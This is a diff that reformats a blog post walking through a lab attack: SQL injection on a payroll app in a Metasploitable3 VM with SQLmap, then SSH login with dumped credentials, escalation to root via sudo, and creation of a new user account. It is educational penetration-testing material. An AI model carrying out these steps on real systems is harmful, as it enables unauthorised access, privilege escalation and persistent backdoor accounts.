@@ -11,7 +11,7 @@ categories:
     - Parrot OS
 ---
 
-# SQL Injection on Payroll Web Application using SQLmap
+SQL Injection on Payroll Web Application using SQLmap
 
 An open-source program called SQLmap is used in penetration tests to find and take advantage of injection vulnerabilities. Because SQLmap automates the process of identifying and taking advantage of SQL injection, it is especially helpful in saving time.
 
@@ -187,7 +187,9 @@ Table: users
 [*] ending @ 12:53:37 /2024-03-03/
 
 ```
-# Connect using SSH. Select a username and password from the lists above.
+
+Connect using SSH. Select a username and password from the lists above
+
 ```shell
 
 ┌─[parrot@parrot]─[~]
@@ -221,7 +223,8 @@ leia_organa@metasploitable3-ub1404:~$ sudo -s
 root@metasploitable3-ub1404:~# 
 ```
 
-# Add new user
+Add new user
+
 ```shell
 root@metasploitable3-ub1404:~# adduser abril
 Adding user `abril' ...
@@ -234,11 +237,11 @@ Retype new UNIX password:
 passwd: password updated successfully
 Changing the user information for abril
 Enter the new value, or press ENTER for the default
-	Full Name []: abril jordan casinillo
-	Room Number []: 47
-	Work Phone []: 123456789
-	Home Phone []: 123456789
-	Other []: 14344
+ Full Name []: abril jordan casinillo
+ Room Number []: 47
+ Work Phone []: 123456789
+ Home Phone []: 123456789
+ Other []: 14344
 Is the information correct? [Y/n] Y
 root@metasploitable3-ub1404:~# su - abril
 abril@metasploitable3-ub1404:~$ 
